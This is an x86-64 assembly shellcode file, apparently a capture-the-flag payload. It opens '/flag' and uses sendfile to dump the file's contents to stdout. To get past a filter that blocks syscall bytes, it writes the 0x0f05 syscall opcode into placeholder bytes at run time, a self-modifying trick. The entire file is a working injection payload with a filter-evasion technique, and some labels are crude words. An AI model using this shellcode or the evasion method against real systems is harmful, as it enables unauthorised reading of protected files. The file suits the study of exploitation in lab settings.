        .intel_syntax noprefix
        .global _start
        .data

_start:
open:
	// open 
//	mov rax,2
	xor rax, rax
	inc rax
	inc rax
	//const char __user * filename
	mov rdx, 0x67616c662faaaaaa
	shr	rdx, 24
	push 	rdx
	mov rdi, rsp
	// int flags
	xor rsi, rsi
	// umode_t mode
	xor rdx, rdx
	// 0f 05
	//inc word ptr [cocks]
	movw [cocks], 0x050f
	//syscall
cocks:	.byte 0xff, 0xff
	push rax

sendfile:
        // size_t count
	mov 	r10, 123456789
	// loff_t__user * offset
	xor 	rdx, rdx
	// int in_fd
	pop 	rsi
	// int out_fd
	xor 	rdi, rdi
	inc rdi

	mov	al, 40

	movw [dicks], 0x050f
dicks: .byte 0xff, 0xff
exit:	//exit
	mov 	al, 60
	xor	rdi, rdi
	syscall
